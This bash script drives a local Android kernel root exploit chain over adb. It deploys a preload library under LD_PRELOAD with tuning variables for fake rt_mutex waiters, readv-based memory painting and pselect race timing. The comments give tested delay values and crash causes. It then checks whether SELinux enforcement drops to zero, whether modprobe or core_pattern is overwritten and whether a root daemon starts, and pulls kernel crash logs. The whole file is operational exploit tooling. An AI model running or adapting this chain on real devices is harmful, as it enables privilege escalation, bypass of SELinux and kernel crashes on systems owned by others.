#!/usr/bin/env bash
# run_chain.sh —— 跑一轮完整 chain（设备端一个进程，进程内三轮 route）
#
#   ./scripts/run_chain.sh <tag> [delay_usec] [额外 ENV ...]
#   ./scripts/run_chain.sh B500 150
#   ./scripts/run_chain.sh B500 150 "NO_IDLE=1"
#
# delay_usec 是 PSELECT_ROUTE_DELAY_USEC —— 是**时序**，不是"等待多久"。
#   150 = 已验证可用值。压到 90/60 会让 rt_mutex_adjust_prio_chain 走岔，
#   直接 BUG at kernel/locking/rtmutex_common.h:60（B319/B320/B321 三次）。
#
# 本脚本只负责：起跑 → 盯 uptime/sysname/enforce/日志 → 提前收工 → 抓 pstore。
# 判定"是否成功"在 root_try.sh 里做。
set -uo pipefail
source "$(cd "$(dirname "$0")" && pwd)/env.sh"

TAG="${1:?usage: $0 <tag> [delay_usec] [extra ENV ...]}"
DLY="${2:-150}"
shift 2 2>/dev/null || true
EXTRA="$*"

OUT="$LOGDIR/chain_$TAG.txt"
RUNLOG="$DEV_RUNS/$TAG.log"
HB="$DEV_RUNS/hb.log"
ENF="$DEV_RUNS/enforce_$TAG.log"

: > "$OUT"
say() { echo "$*" >> "$OUT"; }
D() { timeout 20 "$ADB" shell "$1" 2>&1 | tr -d '\r'; }

kill_adb
sleep 1
"$ADB" start-server >/dev/null 2>&1
wait_device 40 || { echo "[-] 等不到设备"; exit 1; }

say "== $TAG (delay=${DLY}us extra='$EXTRA') start $(date -Is) =="

# 等系统起来 + 等 load 落下来。loadavg 高的时候 perf 采样会失真，
# cred 地址要跨 attempt 一致才采信（见 docs/ROOT_CHAIN.md「避坑 P9」）。
for _ in $(seq 1 30); do
  [ "$(D 'getprop sys.boot_completed')" = "1" ] && break
  sleep 3
done
for _ in $(seq 1 20); do
  li=$(D "cut -d' ' -f1 /proc/loadavg")
  [ -n "$li" ] && [ "${li%.*}" -le 8 ] 2>/dev/null && break
  say "  wait idle loadavg=$li"
  sleep 3
done

UP0=$(D "cut -d'.' -f1 /proc/uptime")
say "boot_completed=$(D 'getprop sys.boot_completed') uptime0=${UP0}s sysname=[$(D 'uname -s')]"
say "modprobe_before=[$(D 'cat /proc/sys/kernel/modprobe 2>/dev/null')] corepat_before=[$(D 'cat /proc/sys/kernel/core_pattern 2>/dev/null')] enforce_before=[$(D 'cat /sys/fs/selinux/enforce 2>/dev/null')]"

# so 版本核对：推错 so 会让所有判据失去意义（旧 so 没有 THREAD_RACE）。
WANT_MD5="${SO_MD5:-$(cat "$LOGDIR/.so_md5" 2>/dev/null)}"
m=$(D "md5sum $DEV_BIN/preload.so 2>/dev/null | cut -d' ' -f1")
if [ -n "${WANT_MD5:-}" ] && [ "$m" != "$WANT_MD5" ]; then
  say "!! so md5 不符（设备=$m 期望=$WANT_MD5）—— 先跑 scripts/deploy.sh"
  exit 1
fi
say "preload md5=$m"

# 心跳：每秒记 uptime + loadavg。panic 后从最后两行能算出死亡时刻。
D "rm -f $HB; ( while :; do echo \"\$(date +%s) \$(cut -d. -f1 /proc/uptime) \$(cut -d' ' -f1 /proc/loadavg)\" >> $HB; sleep 1; done ) >/dev/null 2>&1 & ( while :; do sync; sleep 5; done ) >/dev/null 2>&1 &" >/dev/null
say "heartbeat started"

# enforce 守望者：设备本地死循环把 /sys/fs/selinux/enforce 写进 /data 下的文件。
# panic 会重启，但 /data 不丢，所以"写落地那一瞬间 enforce 变 0"这件事
# 能在重启之后从文件里读出来 —— 这是唯一不受 panic 影响的观测通道。
D "mkdir -p $DEV_RUNS; rm -f $ENF; ( while :; do echo \"\$(cut -d. -f1 /proc/uptime) \$(cat /sys/fs/selinux/enforce 2>&1)\" >> $ENF; done ) >/dev/null 2>&1 &" >/dev/null
say "enforce watcher started -> $ENF"

# 写 waiter 的原语用 readv（pselect 只当封堵器）。
# ★ nfds 必须 > 320 才走 kvmalloc 分支 ★
#   core_sys_select 在小 nfds 时会用栈内 fd_set，把 waiter 直接 memset 掉。
#   READV_IOV_SEGS=8 → 10 个 waiter word 全控（lock 用 fake_lock）
#   READV_IOV_SEGS=5 → 只控 tree_entry，task/lock 保留 futex 陈旧值
ENVS="WRITE_ORACLE=${ORACLE:-uts_fops} FAKE_LOCK_HELD=0 RB_LEFTMOST_PAD=1 \
PSELECT_ROUTE_DELAY_USEC=$DLY USE_FAKE_TASK=1 \
FAKE_TASK_PI_WAITERS_SPRAY=1 FAKE_TASK_BLOCKED_ON_SPRAY=1 PI_CONSUMER=sched_setattr \
UTS_SAMPLER=1 READV_IOV_SEGS=${SEGS:-8} PSELECT_ROUTE_NFDS=${NFDS:-640} \
PAINT_HOLD=${HOLD:-spin} PAINT_SPIN_MAX=${SPINMAX:-400000000} LOG_FSYNC=1 \
PAINT_SRC=${SRC:-sigret} PRCTL_WAITER_WORD=${PWORD:-3} PRCTL_MAP_SIZE=${PMAPSZ:-104} \
WAITER_WORDS_DUMP=1"
[ -n "$EXTRA" ] && ENVS="$ENVS $EXTRA"

D "mkdir -p $DEV_RUNS; rm -f $RUNLOG" >/dev/null
T0=$(date +%s)
say "launch epoch=$T0"
D "cd $DEV_BIN && (echo \"START \$(date +%s)\" > $RUNLOG; timeout -k 2 ${RUNSEC} env $(echo $ENVS) LD_PRELOAD=./preload.so /system/bin/sleep ${SLEEPSEC} >> $RUNLOG 2>&1; echo \"END \$(date +%s) RC=\$?\" >> $RUNLOG) >/dev/null 2>&1 &" >/dev/null

REBOOTED=0
for i in $(seq 1 200); do
  sleep 3
  up=$(D "cut -d'.' -f1 /proc/uptime")
  if [ -z "$up" ]; then
    say "  t=+$((i*3))s adb 无响应，继续重试"
    continue
  fi
  if [ -n "$UP0" ] && [ "$up" -lt "$UP0" ] 2>/dev/null; then
    say "  t=+$((i*3))s uptime 归零（$up < $UP0）→ 已重启"
    REBOOTED=1
    break
  fi
  sn=$(D "uname -s")
  last=$(D "tail -1 $RUNLOG 2>/dev/null")
  enf=$(D "cat /sys/fs/selinux/enforce 2>/dev/null")
  say "  t=+$((i*3))s uptime=${up}s sysname=[${sn}] enforce=[${enf}] last='${last}'"
  case "$last" in END*) say "  正常结束"; break;; esac
  # ★ 提前收工 ★
  # FAST_ROOT 起 daemon 的那一刻目标已达成，再等 sleep 跑满 480 秒纯属浪费
  # （B409 实测：daemon 在第 40 秒出现，循环空转到 540 秒 timeout）。
  # 不能用 tail -3 判断 —— daemon 之后 3 秒内又打出 4 行，轮询正好错过。
  case "$(D "grep -c 'FAST_ROOT daemon' $RUNLOG 2>/dev/null")" in
    0|"") ;;
    *) say "  daemon 已起，提前收工"; break;;
  esac
done

say ""
say "--- 心跳尾部（死亡瞬间）---"
D "tail -6 $HB 2>/dev/null" >> "$OUT"
say ""
say "--- exploit 日志 ---"
D "cat $RUNLOG 2>/dev/null | tr -d '\0' | grep -aE 'peek|payload-lock|START|route setup|consumer done|pselect returned|hold returned|uts oracle|END|fake payload|readv paint|waiter word|PAGE_ORACLE|page oracle|paint done|sigreturn paint|route round|post-route|FAST_ROOT|write target|stack-lock|perf |CMP_REQUEUE|EDEADLK|owner:|uts sampler|pselect route' | tail -70" >> "$OUT"
say ""
say "--- 判定 ---"
say "  rebooted=$REBOOTED  uptime_now=$(D 'cut -d. -f1 /proc/uptime')s"
say "  bootreason=$(D 'getprop ro.boot.bootreason')"
say "  sysname_now=[$(D 'uname -s')]   <- GLORACLE 代表写落地"
say "  modprobe_after=[$(D 'cat /proc/sys/kernel/modprobe 2>/dev/null | tr -d \"\\r\"')]  <- 空串 = 零写落地"
say "  corepat_after=[$(D 'cat /proc/sys/kernel/core_pattern 2>/dev/null')]"
say ""
say "--- enforce 守望者（重启后仍留存，看有没有出现过 0）---"
say "  rows=$(D "wc -l < $ENF 2>/dev/null")   zeros=$(D "grep -c ' 0$' $ENF 2>/dev/null")"
say "  head: $(D "head -3 $ENF 2>/dev/null | tr '\n' ' | '")"
say "  第一个 0: $(D "grep -n ' 0$' $ENF 2>/dev/null | head -1")"
say "  tail: $(D "tail -3 $ENF 2>/dev/null | tr '\n' ' | '")"

# 内核崩溃现场。/sys/fs/pstore 目录不可列举（stat 被拒），只能按已知文件名直接 cat。
# console-ramoops-0 里有 pc/lr/Call trace/寄存器，是唯一能定位
# "死在 chain 哪一条指令、x21 是什么"的通道。
if [ "$REBOOTED" = "1" ]; then
  "$ADB" wait-for-device >/dev/null 2>&1
  for _ in $(seq 1 40); do
    [ "$(D 'getprop sys.boot_completed')" = "1" ] && break
    sleep 3
  done
  sleep 2
  say ""
  say "--- pstore 内核崩溃现场 ---"
  "$ADB" exec-out cat /sys/fs/pstore/console-ramoops-0 2>/dev/null > "$LOGDIR/pstore_$TAG.txt"
  grep -aE "Unable to handle|Internal error|pc : |lr : |Call trace|^\[ *[0-9]+\.[0-9]+\] +[a-z_0-9]+\+0x|Kernel panic| x[0-9]+ *:| pstate:|Process " "$LOGDIR/pstore_$TAG.txt" 2>/dev/null | tail -30 >> "$OUT"
fi
say "== end $(date -Is) =="
